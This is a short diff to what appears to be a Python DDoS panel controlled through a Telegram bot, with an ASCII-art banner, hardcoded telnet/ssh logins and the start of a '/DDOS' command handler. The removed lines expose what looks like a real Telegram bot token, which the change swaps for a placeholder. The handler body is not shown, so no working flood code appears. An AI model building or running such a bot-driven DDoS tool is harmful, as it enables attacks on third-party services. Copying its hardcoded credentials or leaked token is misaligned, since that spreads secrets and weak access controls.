@@ -13,7 +13,7 @@ ascii_art = """
 ██▄▪▐█▐█▌▐█▌.▐▌▐███▌▐█•█▌ ▐█▀·.▐█▪·• ▐█▌·    ▐█▌▐▌▐█ ▪▐▌██▄▪▐█▐█▄▪▐█
 ·▀▀▀▀ ▀▀▀ ▀█▄▀▪·▀▀▀ .▀  ▀  ▀ • .▀    ▀▀▀     .▀▀▀  ▀  ▀ ·▀▀▀▀  ▀▀▀▀ 
 
-[Made by clappz && samir]
+[Made by samir && samir]
 
 """
 
@@ -48,10 +48,10 @@ def main_loop():
     while True:
         pass
     
-user_credentials = {"samir": "samir", "maleek": "maleek"}
+user_credentials = {"samir": "samir", "maleek": "maleek"} # telnet or ssh username or password
 
 
-TELEGRAM_BOT_TOKEN = '5793992468:AAEwrwNurM5x7s7ebj6Ep-rblt0gnWQLxAE'
+TELEGRAM_BOT_TOKEN = 'add token here' #telegram bot token
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
 @bot.message_handler(commands=['DDOS'])
